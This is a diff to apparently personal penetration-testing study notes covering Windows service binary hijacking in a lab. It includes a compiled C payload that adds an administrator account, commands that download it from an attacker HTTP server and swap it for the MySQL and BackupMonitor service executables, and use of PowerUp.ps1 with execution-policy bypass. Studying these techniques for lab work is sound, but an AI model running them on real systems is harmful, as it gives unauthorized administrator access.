@@ -1979,7 +1979,73 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     iwr -uri http://192.168.45.221/Seatbelt.exe -Outfile Seatbelt.exe
     .\Seatbelt.exe -group=all
     ```
-- dd
+- 17.2.1 Service Binary Hijacking
+  - service binary mysql replace  
+    Kali machine create binary file to add new user 'dave2' as 'administrator group' > cross-compile > start web server    
+    ```
+    nano adduser.c
+
+    #include <stdlib.h>
+
+    int main ()
+    {
+     int i;
+
+     i = system ("net user dave2 password123! /add");
+     i = system ("net localgroup administrators dave2 /add");
+
+    return 0;
+    }
+
+    x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+    python3 -m http.server 80
+    ```
+    RDP to target > check running services > check permission of mysqld.exe > download kali adduser.exe to local > backup local mysqld.exe > move downloaded adduser.exe to replace mysqld.exe  > stop mysql > shut down machine > check new user created > run as new user
+    ```
+    Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}  //look for non C:\Windows\System32 directory service
+    icacls "C:\xampp\mysql\bin\mysqld.exe"
+
+    iwr -uri http://192.168.45.221/adduser.exe -Outfile adduser.exe
+    move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+    move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+
+    net stop mysql
+    shutdown /r /t 0
+    Get-LocalGroupMember administrators
+
+    run powerShell as admin
+    runas /user:dave2 cmd
+    type C:\Users\daveadmin\Desktop\flag.txt
+    ```
+  - PowerUp.ps1 to identify a service to modify  
+    Kali start PowerUp.ps1 (post exploitation tool)  
+    ```
+    cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+    python3 -m http.server 80
+    ```
+
+    Target replace BackupMonitor.exe with adduser.exe
+    ```
+    iwr -uri http://192.168.45.221/PowerUp.ps1 -Outfile PowerUp.ps1
+    powershell -ep bypass
+    . .\PowerUp.ps1
+    Get-ModifiableServiceFile
+
+    Output>BackupMonitor
+
+    iwr -uri http://192.168.45.221/adduser.exe -Outfile adduser.exe
+    move C:\BackupMonitor\BackupMonitor.exe BackupMonitor.exe
+    move .\adduser.exe C:\BackupMonitor\BackupMonitor.exe
+
+    net stop BackupMonitor  
+    shutdown /r /t 0
+
+    rdp as 'dave2'
+    run powerShell as admin
+    type C:\Users\roy\Desktop\flag.txt
+    ```
+- 17.2.2 DLL Hijacking
+- 17.2.3 Unquoted Service Paths
 
 ## Penetration testing report 
 - note editor:
